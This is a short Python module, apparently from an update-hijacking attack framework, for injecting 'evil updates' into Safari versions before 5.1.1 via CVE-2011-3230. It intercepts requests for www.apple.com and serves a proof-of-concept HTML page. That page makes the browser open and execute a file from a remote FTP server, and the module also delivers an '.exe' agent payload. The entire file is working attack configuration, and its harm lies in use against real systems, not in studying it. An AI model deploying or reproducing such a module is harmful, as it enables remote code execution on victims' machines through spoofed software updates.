from modules import ModuleBase


class Safari(ModuleBase):
    name = 'Safari'
    version = '1.0'
    appver = '< 5.1.1'
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com>']
    description = """This module is used to inject evil updates at safari using the vulnerability CVE-2011-3230 discovered by Aaron Sigel""",
    vh = '(www.apple.com)' 
    requests = [
        {   'path': '(safari)',
            'type': 'file',
            'method': '',
            'bin': 0,
            'string' : "",
            'parse': 1,
            'file': './include/safari/ISR-safaripoc.html',
        },
        {   'path': '.exe',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        }
    ]
    options = {
        'server': {
            'val': 'ftp://anonymous:xfdsfsdf@ftp.openvz.org/',
            'desc': 'Ftp server'
        },
        'file': {
            'val': '/Volumes/ftp.openvz.org/doc/openvz-intro.pdf',
            'desc': 'File to execute'
        },
        'rnd1': {
            'val': 'rand_num(5)',
            'hidden': 1,
            'dynamic': 1,
        }
    }